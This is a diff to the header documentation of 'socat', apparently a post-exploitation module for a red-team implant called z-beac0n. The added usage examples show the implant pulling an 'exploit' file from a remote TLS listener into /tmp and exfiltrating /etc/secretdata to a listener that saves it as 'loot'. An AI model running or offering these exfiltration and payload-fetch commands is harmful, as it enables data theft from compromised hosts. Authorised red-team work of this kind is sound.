@@ -1,7 +1,7 @@
 ///name: socat
 ///description: "Concatenate and redirect sockets"
 ///author: Z-Labs
-///tags: ['windows', 'linux','TA0007', 'T1083', 'z-labs']
+///tags: ['linux','TA0007', 'T1083', 'z-labs']
 ///category: "POSTEX-BOF"
 ///OS: cross-platform
 ///sources:
@@ -18,15 +18,25 @@
 ///   TCP:<host:port>
 ///   TLS:<host:ssl-enabled port>
 ///
-/// Example use case: data exfiltration via TLS channel with z-beac0n:
+/// Example use case 1: out-of-band data fetch from remote server:
 ///
-/// Setting up listener with ncat on the server-side:
-///   ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem > loot
-/// OR with socat (original):
-///   socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
+///   Setting up data server:
+///     ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem < exploit
+///   OR with socat:
+///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:exploit
 ///
-/// In the implant:
-///   z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
+///   In the implant:
+///     z-beac0n> socat --argv TLS:remotehost:8443 CREATE:/tmp/exploit
+///
+/// Example use case 2: data exfiltration via TLS channel with z-beac0n:
+///
+///   Setting up listener with ncat on the server-side:
+///     ncat --ssl -nlvp 8443 --ssl-cert cert.pem --ssl-key key.pem > loot
+///   OR with socat:
+///     socat OPENSSL-LISTEN:8443,reuseaddr,cert=cert.pem,key=key.pem,verify=0 GOPEN:loot
+///
+///   In the implant:
+///     z-beac0n> socat --argv OPEN:/etc/secretdata TLS:remotehost:8443
 ///arguments:
 ///- name: src_address
 ///  desc: "path to a file that will be overwritten"
